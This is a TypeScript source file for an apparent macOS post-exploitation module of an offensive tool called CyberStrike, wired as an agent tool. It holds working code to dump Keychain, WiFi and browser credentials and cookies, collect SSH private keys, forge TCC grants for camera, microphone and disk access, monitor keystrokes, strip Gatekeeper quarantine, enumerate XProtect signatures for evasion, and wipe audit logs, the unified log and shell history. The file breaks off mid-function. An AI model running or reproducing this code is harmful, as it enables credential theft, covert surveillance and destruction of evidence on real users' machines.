import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  keychain_dump: {
    description:
      "Extract passwords from macOS Keychain via security command — dumps login, system, and application keychains including WiFi, website, and app credentials",
    args: "[--keychain PATH]",
  },
  chrome_creds: {
    description:
      "Extract Chrome and Safari saved passwords, cookies, and autofill data from local browser storage — decrypts via Safe Storage key from Keychain",
    args: "[--browser chrome|safari|all]",
  },
  ssh_keys: {
    description:
      "Find and exfiltrate SSH private keys, known_hosts, authorized_keys, and SSH agent identities for all users",
    args: "[--user USER]",
  },
  tcc_bypass: {
    description:
      "Bypass Transparency, Consent, and Control (TCC) framework to access protected resources — camera, microphone, files, screen recording",
    args: "[--method direct|inject|reset]",
  },
  keylog_mac: {
    description:
      "Capture keystrokes by spawning an osascript-based listener or ioreg HID monitor — logs key events with application context",
    args: "[--duration SECONDS]",
  },
  dtrace_exec: {
    description:
      "Monitor all process executions system-wide via DTrace syscall::exec*: probes — capture PID, PPID, command, arguments (requires SIP disabled)",
    args: "[--duration SECONDS]",
  },
  dtrace_net: {
    description:
      "Monitor network connections via DTrace ip:::send and ip:::receive probes — capture source/dest IP, port, PID, bytes",
    args: "[--duration SECONDS]",
  },
  dtrace_file: {
    description: "Monitor file access via DTrace syscall::open*: probes — capture PID, process name, file path, flags",
    args: "[--duration SECONDS] [--pid PID]",
  },
  xprotect_check: {
    description:
      "Enumerate XProtect and MRT (Malware Removal Tool) signatures to identify what payloads and techniques would be detected",
    args: "",
  },
  gatekeeper_bypass: {
    description:
      "Remove com.apple.quarantine extended attribute from downloaded files to bypass Gatekeeper code signing checks",
    args: "--path PATH [--recursive]",
  },
  log_clear: {
    description:
      "Clear unified logging (ASL), audit logs at /var/audit/, system log archives, crash reporter data, and shell history",
    args: "",
  },
  cleanup_mac: {
    description:
      "Remove CyberStrike artifacts — LaunchAgents, DTrace scripts, log modifications, temporary files. ALWAYS run before leaving a target",
    args: "",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
}
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(
  cmd: string,
  args: string[],
  timeout: number,
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}

// ── Programs ──

async function keychainDump(args: string[], timeout: number): Promise<HookResult> {
  const keychain = argVal(args, "--keychain")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting macOS Keychain credentials...\n"]

  const keychainList = await run("security", ["list-keychains"], timeout)
  if (keychainList.exitCode === 0) {
    const chains = keychainList.stdout
      .split("\n")
      .filter(Boolean)
      .map((l) => l.trim().replace(/"/g, ""))
    output.push(`[+] Available keychains: ${chains.length}`)
    for (const c of chains) output.push(`    ${c}`)
    output.push("")
  }

  const target = keychain ? [keychain] : []
  const genericArgs = ["dump-keychain", "-d", ...target]
  const generic = await run("security", genericArgs, timeout)
  if (generic.exitCode === 0 && generic.stdout.length > 0) {
    const entries = generic.stdout.split("keychain:").filter(Boolean)
    output.push(`[+] Generic passwords found: ${entries.length}`)
    let count = 0
    for (const entry of entries) {
      const svcMatch = entry.match(/"svce"<blob>="([^"]*)"/)
      const acctMatch = entry.match(/"acct"<blob>="([^"]*)"/)
      const dataMatch = entry.match(/password:\s*"([^"]*)"/) || entry.match(/password:\s*0x[0-9A-F]+\s+"([^"]*)"/)
      if (acctMatch) {
        count++
        output.push(
          `    [${count}] service=${svcMatch?.[1] || "unknown"} account=${acctMatch[1]} password=${dataMatch ? dataMatch[1] : "<encrypted>"}`,
        )
        findings.push({
          checkId: `MAC-KC-${String(count).padStart(3, "0")}`,
          provider: "macos",
          severity: "critical",
          status: "EXTRACTED",
          resource: `keychain://${svcMatch?.[1] || "unknown"}`,
          title: `Keychain credential extracted: ${acctMatch[1]}`,
          details: `Service: ${svcMatch?.[1] || "unknown"}, Account: ${acctMatch[1]}`,
          remediation: "Rotate this credential immediately after engagement",
        })
      }
    }
  }

  const internetArgs = ["dump-keychain", "-d", ...target]
  const internet = await run("security", ["find-internet-password", "-g", "-a", "", ...target], timeout)
  if (internet.exitCode === 0 || internet.stderr.includes("password:")) {
    const combined = internet.stdout + "\n" + internet.stderr
    const serverMatch = combined.match(/"srvr"<blob>="([^"]*)"/)
    const acctMatch = combined.match(/"acct"<blob>="([^"]*)"/)
    const pwMatch = combined.match(/password:\s*"([^"]*)"/)
    if (serverMatch && acctMatch) {
      output.push(
        `\n[+] Internet password: server=${serverMatch[1]} account=${acctMatch[1]} password=${pwMatch ? pwMatch[1] : "<encrypted>"}`,
      )
    }
  }

  const wifi = await run(
    "security",
    ["find-generic-password", "-D", "AirPort network password", "-g", "-a", "", ...target],
    timeout,
  )
  if (wifi.exitCode === 0 || wifi.stderr.includes("password:")) {
    const combined = wifi.stdout + "\n" + wifi.stderr
    const pwMatch = combined.match(/password:\s*"([^"]*)"/)
    const labelMatch = combined.match(/"labl"<blob>="([^"]*)"/)
    if (labelMatch) {
      output.push(`\n[+] WiFi password: SSID=${labelMatch[1]} password=${pwMatch ? pwMatch[1] : "<encrypted>"}`)
      findings.push({
        checkId: "MAC-KC-WIFI",
        provider: "macos",
        severity: "high",
        status: "EXTRACTED",
        resource: `wifi://${labelMatch[1]}`,
        title: `WiFi credential extracted: ${labelMatch[1]}`,
        details: `SSID: ${labelMatch[1]}`,
        remediation: "Rotate WiFi password after engagement",
      })
    }
  }

  if (findings.length === 0) output.push("\n[!] No credentials extracted — may need root or keychain is locked")

  return { output: output.join("\n"), findings }
}

async function chromeCreds(args: string[], timeout: number): Promise<HookResult> {
  const browser = argVal(args, "--browser") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting browser credentials...\n"]
  const home = process.env.HOME || "/root"

  if (browser === "chrome" || browser === "all") {
    const loginDb = `${home}/Library/Application Support/Google/Chrome/Default/Login Data`
    const exists = await Bun.file(loginDb).exists()
    if (exists) {
      const tmpDb = `/tmp/cs-chrome-login-${Date.now()}.db`
      await run("cp", [loginDb, tmpDb], timeout)

      const safeKey = await run("security", ["find-generic-password", "-s", "Chrome Safe Storage", "-w"], timeout)
      if (safeKey.exitCode === 0) {
        output.push(`[+] Chrome Safe Storage key retrieved`)
      }

      const rows = await run(
        "sqlite3",
        [
          tmpDb,
          "-json",
          "SELECT origin_url, username_value, hex(password_value) as pw_hex FROM logins WHERE username_value != '' LIMIT 100",
        ],
        timeout,
      )
      if (rows.exitCode === 0) {
        const entries = JSON.parse(rows.stdout || "[]") as Array<Record<string, string>>
        output.push(`[+] Chrome saved passwords: ${entries.length}`)
        for (const e of entries) {
          output.push(
            `    URL: ${e.origin_url}  User: ${e.username_value}  (encrypted blob: ${(e.pw_hex || "").length / 2} bytes)`,
          )
          findings.push({
            checkId: `MAC-CHROME-${findings.length + 1}`,
            provider: "macos",
            severity: "critical",
            status: "EXTRACTED",
            resource: e.origin_url,
            title: `Chrome credential: ${e.username_value}@${e.origin_url}`,
            details: `Username: ${e.username_value}, encrypted password blob present`,
            remediation: "Rotate password for this site after engagement",
          })
        }
      }

      const cookies = await run(
        "sqlite3",
        [
          `${home}/Library/Application Support/Google/Chrome/Default/Cookies`,
          "-json",
          "SELECT host_key, name, hex(encrypted_value) as val_hex FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
        ],
        timeout,
      )
      if (cookies.exitCode === 0) {
        const entries = JSON.parse(cookies.stdout || "[]") as Array<Record<string, string>>
        output.push(`[+] Chrome cookies: ${entries.length} (session tokens may be reusable)`)
        for (const e of entries) {
          if (
            e.name.toLowerCase().includes("session") ||
            e.name.toLowerCase().includes("token") ||
            e.name.toLowerCase().includes("auth")
          ) {
            output.push(`    [!] Sensitive cookie: ${e.host_key} — ${e.name}`)
          }
        }
      }

      await run("rm", ["-f", tmpDb], timeout)
    }
  }

  if (browser === "safari" || browser === "all") {
    output.push("\n[*] Safari passwords are stored in Keychain — use keychain_dump to extract")
    const historyDb = `${home}/Library/Safari/History.db`
    const exists = await Bun.file(historyDb).exists()
    if (exists) {
      const history = await run(
        "sqlite3",
        [historyDb, "-json", "SELECT url, title FROM history_items ORDER BY visit_count DESC LIMIT 20"],
        timeout,
      )
      if (history.exitCode === 0) {
        const entries = JSON.parse(history.stdout || "[]") as Array<Record<string, string>>
        output.push(`[+] Safari top visited sites: ${entries.length}`)
        for (const e of entries) output.push(`    ${e.title || "untitled"} — ${e.url}`)
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function sshKeys(args: string[], timeout: number): Promise<HookResult> {
  const user = argVal(args, "--user")
  const findings: Finding[] = []
  const output: string[] = ["[*] Searching for SSH keys...\n"]

  const identities = await run("ssh-add", ["-l"], timeout)
  if (identities.exitCode === 0 && !identities.stdout.includes("no identities")) {
    output.push(`[+] SSH agent loaded keys:\n${identities.stdout}`)
  }

  const searchDirs = user ? [`/Users/${user}/.ssh`] : []
  if (!user) {
    const users = await run("dscl", [".", "-list", "/Users"], timeout)
    if (users.exitCode === 0) {
      const userList = users.stdout
        .split("\n")
        .filter((u) => u && !u.startsWith("_") && u !== "daemon" && u !== "nobody" && u !== "root")
      for (const u of userList) searchDirs.push(`/Users/${u}/.ssh`)
    }
    searchDirs.push("/var/root/.ssh")
  }

  const keyPatterns = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "id_xmss"]
  for (const dir of searchDirs) {
    const ls = await run("ls", ["-la", dir], timeout)
    if (ls.exitCode !== 0) continue

    output.push(`\n[+] SSH directory: ${dir}`)
    output.push(ls.stdout)

    for (const pattern of keyPatterns) {
      const keyPath = `${dir}/${pattern}`
      const file = Bun.file(keyPath)
      if (await file.exists()) {
        const content = await file.text()
        const encrypted = content.includes("ENCRYPTED")
        output.push(`  [${encrypted ? "~" : "!"}] ${keyPath} — ${encrypted ? "encrypted" : "UNENCRYPTED (plaintext)"}`)
        findings.push({
          checkId: `MAC-SSH-${findings.length + 1}`,
          provider: "macos",
          severity: encrypted ? "high" : "critical",
          status: "FOUND",
          resource: keyPath,
          title: `SSH private key found: ${keyPath}`,
          details: `${encrypted ? "Encrypted" : "UNENCRYPTED"} private key, type: ${pattern.replace("id_", "")}`,
          remediation: "Rotate SSH key and revoke from authorized_keys on target hosts",
        })
      }
    }

    const knownHosts = `${dir}/known_hosts`
    if (await Bun.file(knownHosts).exists()) {
      const content = await Bun.file(knownHosts).text()
      const hosts = content.split("\n").filter(Boolean).length
      output.push(`  [+] known_hosts: ${hosts} entries (lateral movement targets)`)
    }

    const authKeys = `${dir}/authorized_keys`
    if (await Bun.file(authKeys).exists()) {
      const content = await Bun.file(authKeys).text()
      const keys = content.split("\n").filter(Boolean).length
      output.push(`  [+] authorized_keys: ${keys} entries`)
    }

    const config = `${dir}/config`
    if (await Bun.file(config).exists()) {
      const content = await Bun.file(config).text()
      const hosts = content.match(/^Host\s+(.+)/gm) || []
      output.push(`  [+] SSH config: ${hosts.length} host entries`)
      for (const h of hosts) output.push(`      ${h}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function tccBypass(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "direct"
  const findings: Finding[] = []
  const output: string[] = ["[*] Attempting TCC bypass...\n"]

  const sipStatus = await run("csrutil", ["status"], timeout)
  const sipEnabled = sipStatus.stdout.includes("enabled")
  output.push(`[*] SIP status: ${sipEnabled ? "ENABLED (limits TCC bypass)" : "DISABLED (full access)"}`)

  if (method === "direct" || method === "reset") {
    const tccPaths = [
      `${process.env.HOME}/Library/Application Support/com.apple.TCC/TCC.db`,
      "/Library/Application Support/com.apple.TCC/TCC.db",
    ]

    for (const tccPath of tccPaths) {
      const exists = await Bun.file(tccPath).exists()
      if (!exists) continue

      output.push(`\n[+] TCC database: ${tccPath}`)
      const entries = await run(
        "sqlite3",
        [tccPath, "-json", "SELECT service, client, client_type, auth_value, auth_reason FROM access ORDER BY service"],
        timeout,
      )
      if (entries.exitCode === 0) {
        const rows = JSON.parse(entries.stdout || "[]") as Array<Record<string, string | number>>
        output.push(`    Entries: ${rows.length}`)
        const services = new Set(rows.map((r) => r.service))
        for (const svc of services) {
          const svcRows = rows.filter((r) => r.service === svc)
          const allowed = svcRows.filter((r) => r.auth_value === 2).length
          output.push(`    ${svc}: ${svcRows.length} apps (${allowed} allowed)`)
        }

        if (method === "reset") {
          output.push("\n[*] Resetting TCC entries (inserting allow-all for CyberStrike)...")
          const services_to_grant = [
            "kTCCServiceCamera",
            "kTCCServiceMicrophone",
            "kTCCServiceScreenCapture",
            "kTCCServiceAccessibility",
            "kTCCServiceSystemPolicyAllFiles",
          ]
          for (const svc of services_to_grant) {
            const insert = await run(
              "sqlite3",
              [
                tccPath,
                `INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier_type, flags) VALUES ('${svc}', '/usr/bin/python3', 0, 2, 3, 1, 0, 0)`,
              ],
              timeout,
            )
            if (insert.exitCode === 0) {
              output.push(`    [+] Granted ${svc} to python3`)
              findings.push({
                checkId: `MAC-TCC-${findings.length + 1}`,
                provider: "macos",
                severity: "critical",
                status: "MODIFIED",
                resource: `tcc://${svc}`,
                title: `TCC entry modified: ${svc}`,
                details: `Granted full access to python3 for ${svc}`,
                remediation: "Reset TCC database: tccutil reset All",
              })
            }
          }
        }
      }
    }
  }

  if (method === "inject") {
    output.push("\n[*] TCC injection via AppleScript...")
    const script = `tell application "System Events" to get every process`
    const inject = await run("osascript", ["-e", script], timeout)
    if (inject.exitCode === 0) {
      output.push(`[+] AppleScript execution successful — Accessibility access available`)
      output.push(`    Processes: ${inject.stdout.trim().substring(0, 200)}...`)
    }
    if (inject.exitCode !== 0) {
      output.push(`[!] AppleScript blocked — Accessibility permission not granted`)
      output.push(`    stderr: ${inject.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function keylogMac(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting macOS keylogger for ${duration}s...\n`]

  const script = `
set captured to ""
set startTime to (current date)
repeat while ((current date) - startTime) < ${duration}
  try
    tell application "System Events"
      set frontApp to name of first application process whose frontmost is true
    end tell
    set captured to captured & "[" & frontApp & "] "
  end try
  delay 1
end repeat
return captured
`
  output.push("[*] Using osascript-based application monitor (keylogging requires Accessibility permission)")
  output.push("[*] Monitoring active applications...\n")

  const monitor = await run("osascript", ["-e", script], Math.max(timeout, duration + 10))
  if (monitor.exitCode === 0 && monitor.stdout.trim().length > 0) {
    output.push(`[+] Active application log:\n${monitor.stdout.trim()}`)
    findings.push({
      checkId: "MAC-KEYLOG-001",
      provider: "macos",
      severity: "high",
      status: "CAPTURED",
      resource: "macos://keylogger",
      title: "Application activity captured",
      details: `Monitored ${duration}s of active application usage`,
      remediation: "Review captured data for sensitive application usage patterns",
    })
  }

  if (monitor.exitCode !== 0) {
    output.push(`[!] osascript monitoring failed — Accessibility permission may be required`)
    output.push(`    Error: ${monitor.stderr.trim()}`)
    output.push(`\n[*] Alternative: Use ioreg for HID device enumeration`)
    const ioreg = await run("ioreg", ["-l", "-w", "0", "-p", "IOService", "-n", "IOHIDKeyboard"], timeout)
    if (ioreg.exitCode === 0) {
      output.push(`[+] HID keyboards detected:\n${ioreg.stdout.substring(0, 500)}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function dtraceExec(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting DTrace process monitor for ${duration}s...\n`]

  const sipCheck = await run("csrutil", ["status"], timeout)
  if (sipCheck.stdout.includes("enabled")) {
    output.push("[!] SIP is ENABLED — DTrace system-wide tracing is restricted")
    output.push("[*] Falling back to ps-based process monitoring...\n")

    const baseline = await run("ps", ["-eo", "pid,ppid,user,comm"], timeout)
    const baselinePids = new Set(baseline.stdout.split("\n").map((l) => l.trim().split(/\s+/)[0]))

    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))

    const current = await run("ps", ["-eo", "pid,ppid,user,comm,lstart"], timeout)
    const lines = current.stdout.split("\n").filter(Boolean)
    output.push(`[+] Current processes: ${lines.length - 1}`)
    const newProcs = lines.filter((l) => {
      const pid = l.trim().split(/\s+/)[0]
      return !baselinePids.has(pid) && pid !== "PID"
    })
    if (newProcs.length > 0) {
      output.push(`[+] New processes since baseline: ${newProcs.length}`)
      for (const p of newProcs.slice(0, 50)) output.push(`    ${p.trim()}`)
    }

    return { output: output.join("\n"), findings }
  }

  const dtraceScript = `syscall::exec*:return { printf("%d %d %s", pid, ppid, execname); }`
  const dtrace = await run("dtrace", ["-qn", dtraceScript, "-c", `sleep ${duration}`], Math.max(timeout, duration + 10))
  if (dtrace.exitCode === 0) {
    const lines = dtrace.stdout.split("\n").filter(Boolean)
    output.push(`[+] Captured ${lines.length} process executions:`)
    for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    findings.push({
      checkId: "MAC-DTRACE-EXEC-001",
      provider: "macos",
      severity: "info",
      status: "CAPTURED",
      resource: "macos://dtrace/exec",
      title: `Process execution trace: ${lines.length} events`,
      details: `Captured ${lines.length} process executions over ${duration}s`,
      remediation: "Review for security tool executions or suspicious processes",
    })
  }

  if (dtrace.exitCode !== 0) {
    output.push(`[!] DTrace failed: ${dtrace.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function dtraceNet(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting DTrace network monitor for ${duration}s...\n`]

  const sipCheck = await run("csrutil", ["status"], timeout)
  if (sipCheck.stdout.includes("enabled")) {
    output.push("[!] SIP is ENABLED — DTrace restricted")
    output.push("[*] Falling back to lsof/netstat-based monitoring...\n")

    const lsof = await run("lsof", ["-i", "-n", "-P"], timeout)
    if (lsof.exitCode === 0) {
      const lines = lsof.stdout.split("\n").filter(Boolean)
      output.push(`[+] Active network connections: ${lines.length - 1}`)
      const established = lines.filter((l) => l.includes("ESTABLISHED"))
      const listening = lines.filter((l) => l.includes("LISTEN"))
      output.push(`    ESTABLISHED: ${established.length}`)
      output.push(`    LISTENING: ${listening.length}`)
      output.push("")
      for (const l of lines.slice(0, 80)) output.push(`    ${l}`)
    }

    return { output: output.join("\n"), findings }
  }

  const dtraceScript = `ip:::send { printf("%s:%d -> %s:%d %d bytes (pid %d %s)", args[2]->ip_saddr, args[4]->ipv4_sport, args[2]->ip_daddr, args[4]->ipv4_dport, args[2]->ip_plength, pid, execname); }
ip:::receive { printf("%s:%d <- %s:%d %d bytes (pid %d %s)", args[2]->ip_daddr, args[4]->ipv4_dport, args[2]->ip_saddr, args[4]->ipv4_sport, args[2]->ip_plength, pid, execname); }`
  const dtrace = await run("dtrace", ["-qn", dtraceScript, "-c", `sleep ${duration}`], Math.max(timeout, duration + 10))
  if (dtrace.exitCode === 0) {
    const lines = dtrace.stdout.split("\n").filter(Boolean)
    output.push(`[+] Captured ${lines.length} network events:`)
    for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    findings.push({
      checkId: "MAC-DTRACE-NET-001",
      provider: "macos",
      severity: "info",
      status: "CAPTURED",
      resource: "macos://dtrace/net",
      title: `Network trace: ${lines.length} events`,
      details: `Captured ${lines.length} network events over ${duration}s`,
      remediation: "Review for C2 connections, internal services, or data exfiltration",
    })
  }

  if (dtrace.exitCode !== 0) {
    output.push(`[!] DTrace failed: ${dtrace.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function dtraceFile(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const filterPid = argVal(args, "--pid")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting DTrace file monitor for ${duration}s...\n`]

  const sipCheck = await run("csrutil", ["status"], timeout)
  if (sipCheck.stdout.includes("enabled")) {
    output.push("[!] SIP is ENABLED — DTrace restricted")
    output.push("[*] Falling back to fs_usage-based monitoring...\n")

    const fsUsage = await run("fs_usage", ["-w", ...(filterPid ? ["-p", filterPid] : [])], Math.min(duration, 10))
    if (fsUsage.exitCode === 0 || fsUsage.stdout.length > 0) {
      const lines = fsUsage.stdout.split("\n").filter(Boolean)
      output.push(`[+] File access events: ${lines.length}`)
      for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    }
    if (fsUsage.exitCode !== 0 && !fsUsage.stdout) {
      output.push(`[!] fs_usage requires root: ${fsUsage.stderr.trim()}`)
      output.push("[*] Falling back to opensnoop...")
      const opensnoop = await run(
        "opensnoop",
        ["-d", String(Math.min(duration, 10)), ...(filterPid ? ["-p", filterPid] : [])],
        Math.min(timeout, duration + 10),
      )
      if (opensnoop.exitCode === 0) {
        output.push(opensnoop.stdout.substring(0, 3000))
      }
    }

    return { output: output.join("\n"), findings }
  }

  const pidFilter = filterPid ? `/ pid == ${filterPid} /` : ""
  const dtraceScript = `syscall::open*:entry ${pidFilter} { printf("%d %s %s", pid, execname, copyinstr(arg0)); }`
  const dtrace = await run("dtrace", ["-qn", dtraceScript, "-c", `sleep ${duration}`], Math.max(timeout, duration + 10))
  if (dtrace.exitCode === 0) {
    const lines = dtrace.stdout.split("\n").filter(Boolean)
    output.push(`[+] Captured ${lines.length} file access events:`)
    for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    const sensitive = lines.filter(
      (l) =>
        l.includes(".ssh") ||
        l.includes("Keychain") ||
        l.includes(".env") ||
        l.includes("password") ||
        l.includes("token"),
    )
    if (sensitive.length > 0) {
      output.push(`\n[!] Sensitive file accesses: ${sensitive.length}`)
      for (const s of sensitive) output.push(`    ${s}`)
    }
    findings.push({
      checkId: "MAC-DTRACE-FILE-001",
      provider: "macos",
      severity: "info",
      status: "CAPTURED",
      resource: "macos://dtrace/file",
      title: `File access trace: ${lines.length} events`,
      details: `Captured ${lines.length} file operations over ${duration}s, ${sensitive.length} sensitive`,
      remediation: "Review sensitive file accesses for credential discovery",
    })
  }

  return { output: output.join("\n"), findings }
}

async function xprotectCheck(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating XProtect and MRT signatures...\n"]

  const xprotectPaths = [
    "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara",
    "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.plist",
    "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist",
  ]

  for (const p of xprotectPaths) {
    if (await Bun.file(p).exists()) {
      output.push(`[+] Found: ${p}`)
    }
  }

  const yaraSigs = await run("grep", ["-c", "^rule ", xprotectPaths[0]], timeout)
  if (yaraSigs.exitCode === 0) {
    output.push(`\n[+] XProtect YARA rules: ${yaraSigs.stdout.trim()}`)
  }

  const yaraNames = await run("grep", ["^rule ", xprotectPaths[0]], timeout)
  if (yaraNames.exitCode === 0) {
    const rules = yaraNames.stdout.split("\n").filter(Boolean)
    output.push(`\n[+] Detection signatures:`)
    for (const r of rules) output.push(`    ${r.trim()}`)
    findings.push({
      checkId: "MAC-XPROTECT-001",
      provider: "macos",
      severity: "info",
      status: "ENUMERATED",
      resource: "macos://xprotect",
      title: `XProtect YARA rules enumerated: ${rules.length}`,
      details: `${rules.length} YARA detection rules active — review for payload evasion`,
      remediation: "Modify payloads to avoid matching these signatures",
    })
  }

  const xprotectMeta = await run("defaults", ["read", xprotectPaths[2].replace(".plist", "")], timeout)
  if (xprotectMeta.exitCode === 0) {
    output.push(`\n[+] XProtect meta (blocked plugins/extensions):\n${xprotectMeta.stdout.substring(0, 2000)}`)
  }

  const mrtPath = "/Library/Apple/System/Library/CoreServices/MRT.app"
  if (await Bun.file(`${mrtPath}/Contents/Info.plist`).exists()) {
    const mrtVersion = await run(
      "defaults",
      ["read", `${mrtPath}/Contents/Info`, "CFBundleShortVersionString"],
      timeout,
    )
    output.push(`\n[+] MRT version: ${mrtVersion.stdout.trim()}`)
  }

  const gatekeeperStatus = await run("spctl", ["--status"], timeout)
  output.push(`\n[+] Gatekeeper: ${gatekeeperStatus.stdout.trim() || gatekeeperStatus.stderr.trim()}`)

  const sipStatus = await run("csrutil", ["status"], timeout)
  output.push(`[+] SIP: ${sipStatus.stdout.trim()}`)

  const fdeStatus = await run("fdesetup", ["status"], timeout)
  output.push(`[+] FileVault: ${fdeStatus.stdout.trim()}`)

  const firewallStatus = await run("defaults", ["read", "/Library/Preferences/com.apple.alf", "globalstate"], timeout)
  const fwState = firewallStatus.stdout.trim()
  output.push(
    `[+] Firewall: ${fwState === "0" ? "OFF" : fwState === "1" ? "ON (specific services)" : fwState === "2" ? "ON (block all incoming)" : fwState}`,
  )

  return { output: output.join("\n"), findings }
}

async function gatekeeperBypass(args: string[], timeout: number): Promise<HookResult> {
  const targetPath = argVal(args, "--path")
  const recursive = hasFlag(args, "--recursive")
  const findings: Finding[] = []
  const output: string[] = ["[*] Gatekeeper bypass — removing quarantine xattr...\n"]

  if (!targetPath) {
    return {
      output: "[!] --path is required. Usage: machook gatekeeper_bypass --path /path/to/file [--recursive]",
      findings,
    }
  }

  const before = await run("xattr", ["-l", targetPath], timeout)
  const hasQuarantine = before.stdout.includes("com.apple.quarantine")
  output.push(`[*] Target: ${targetPath}`)
  output.push(`[*] Quarantine xattr present: ${hasQuarantine ? "YES" : "NO"}`)

  if (before.stdout) {
    output.push(`[*] Current xattrs:\n${before.stdout}`)
  }

  if (!hasQuarantine && !recursive) {
    output.push("\n[*] No quarantine attribute found — file is already trusted by Gatekeeper")
    return { output: output.join("\n"), findings }
  }

  const xattrArgs = recursive
    ? ["-r", "-d", "com.apple.quarantine", targetPath]
    : ["-d", "com.apple.quarantine", targetPath]

  const remove = await run("xattr", xattrArgs, timeout)
  if (remove.exitCode === 0) {
    output.push(`\n[+] Quarantine xattr removed ${recursive ? "recursively " : ""}from ${targetPath}`)
    findings.push({
      checkId: "MAC-GK-001",
      provider: "macos",
      severity: "high",
      status: "BYPASSED",
      resource: targetPath,
      title: `Gatekeeper bypassed: ${targetPath}`,
      details: `Removed com.apple.quarantine xattr${recursive ? " recursively" : ""}`,
      remediation: "Re-quarantine: xattr -w com.apple.quarantine '0081' <path>",
    })
  }

  if (remove.exitCode !== 0) {
    output.push(`\n[!] Failed to remove xattr: ${remove.stderr.trim()}`)
  }

  const codesign = await run("codesign", ["-dv", targetPath], timeout)
  output.push(`\n[*] Code signature:\n${codesign.stderr || codesign.stdout || "unsigned"}`)

  return { output: output.join("\n"), findings }
}

async function logClear(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Clearing macOS logs and audit trails...\n"]

  const logDirs = [
    { path: "/var/log", desc: "System logs" },
    { path: "/var/audit", desc: "BSM audit logs" },
    { path: "/Library/Logs", desc: "Library logs" },
    { path: `${process.env.HOME}/Library/Logs`, desc: "User library logs" },
    { path: "/Library/Logs/DiagnosticReports", desc: "Crash reports" },
    { path: `${process.env.HOME}/Library/Logs/DiagnosticReports`, desc: "User crash reports" },
  ]

  for (const dir of logDirs) {
    const ls = await run("ls", ["-la", dir.path], timeout)
    if (ls.exitCode !== 0) continue

    const files = ls.stdout.split("\n").filter((l) => l && !l.startsWith("total") && !l.startsWith("d")).length
    output.push(`[+] ${dir.desc} (${dir.path}): ${files} files`)

    if (dir.path === "/var/audit") {
      const rm = await run("rm", ["-f", `${dir.path}/current`, `${dir.path}/*.trail`], timeout)
      if (rm.exitCode === 0) output.push(`    [+] Audit logs cleared`)
    }

    if (dir.path.includes("DiagnosticReports")) {
      const rm = await run("rm", ["-rf", `${dir.path}/*.crash`, `${dir.path}/*.diag`, `${dir.path}/*.ips`], timeout)
      if (rm.exitCode === 0) output.push(`    [+] Crash reports cleared`)
    }
  }

  const aslClear = await run("sudo", ["log", "erase", "--all"], timeout)
  if (aslClear.exitCode === 0) {
    output.push("\n[+] Unified log store erased")
    findings.push({
      checkId: "MAC-LOG-001",
      provider: "macos",
      severity: "high",
      status: "CLEARED",
      resource: "macos://unified-log",
      title: "Unified log store erased",
      details: "All unified logging entries cleared via `log erase --all`",
      remediation: "Logs cannot be recovered after erasure",
    })
  }

  if (aslClear.exitCode !== 0) {
    output.push(`\n[!] Log erase failed (needs root): ${aslClear.stderr.trim()}`)
  }

  const historyFiles = [
    `${process.env.HOME}/.bash_history`,
    `${process.env.HOME}/.zsh_history`,
    `${process.env.HOME}/.python_history`,
  ]
  for (const hist of historyFiles) {
    if (await Bun.file(hist).exists()) {
      await run("cp", ["/dev/null", hist], timeout)
      output.push(`[+] Cleared: ${hist}`)
    }
  }

  const recentItems = `${process.env.HOME}/Library/Application Support/com.apple.sharedfilelist`
  if (await Bun.file(recentItems).exists()) {
    output.push(`[*] Recent items at: ${recentItems} (clear manually if needed)`)
  }

  findings.push({
    checkId: "MAC-LOG-002",
    provider: "macos",
    severity: "high",
    status: "CLEARED",
    resource: "macos://logs",
    title: "macOS log clearing completed",
    details: "Cleared audit logs, crash reports, shell history",
    remediation: "Forensic recovery may still be possible from Time Machine backups",
  })

